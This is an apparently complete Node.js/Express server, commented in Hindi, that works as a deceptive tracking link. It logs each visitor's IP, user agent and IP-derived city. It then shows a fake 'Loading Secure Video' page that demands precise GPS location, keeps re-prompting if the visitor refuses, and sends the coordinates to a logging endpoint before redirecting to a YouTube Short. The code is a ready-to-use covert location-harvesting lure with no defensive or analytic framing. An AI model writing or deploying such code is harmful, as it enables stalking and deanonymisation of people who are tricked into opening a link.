const express = require('express');
const app = express();

const TARGET_URL = 'https://youtube.com/shorts/7EvO-9Cxv-M?si=fxLDlcA0YUaOVLmB';

app.get('/', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    // IP-based fallback log
    fetch(`http://ip-api.com/json/${ip.split(',')[0]}`)
        .then(response => response.json())
        .then(data => {
            console.log(`IP_LOG => Time: ${timestamp} | IP: ${ip} | Location: ${data.city}, ${data.regionName} | Device: ${userAgent}`);
        }).catch(() => {});

    // Ek aisa page jo permission milne tak video open hi nahi hone dega
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading...</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background: #111; color: #fff; }
                .loader { margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            </style>
        </head>
        <body>
            <h2>Loading Secure Video...</h2>
            <div class="loader"></div>
            <p id="msg">Please allow location access to continue...</p>

            <script>
                function askLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(function(position) {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            
                            // GPS data server par bhejna
                            fetch('/save-location?lat=' + lat + '&lon=' + lon)
                                .then(() => {
                                    // Jab server data save kar le, tabhi target video par bhejega
                                    window.location.href = '${TARGET_URL}';
                                }).catch(() => {
                                    window.location.href = '${TARGET_URL}';
                                });
                        }, function(error) {
                            // Agar user block/deny karega, toh video open nahi hoga, message dikhega
                            document.getElementById('msgmi').innerText = "Location permission is required to view this video!";
                            // Dubara popup laane ke liye thodi der baad fir se koshish kar sakte hain
                            setTimeout(askLocation, 3000);
                        }, { timeout: 20000, enableHighAccuracy: true });
                    } else {
                        window.location.href = '${TARGET_URL}';
                    }
                }

                // Page khulte hi permission maangna shuru kar do
                window.onload = function() {
                    askLocation();
                };
            </script>
        </body>
        </html>
    `);
});

// GPS Latitude aur Longitude receive karne ka endpoint
app.get('/save-location', (req, res) => {
    const lat = req.query.lat;
    const lon = req.query.lon;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    console.log(`GPS_EXACT_LOG => IP: ${ip} | Latitude: ${lat} | Longitude: ${lon}`);
    res.sendStatus(200);
});

module.exports = app;
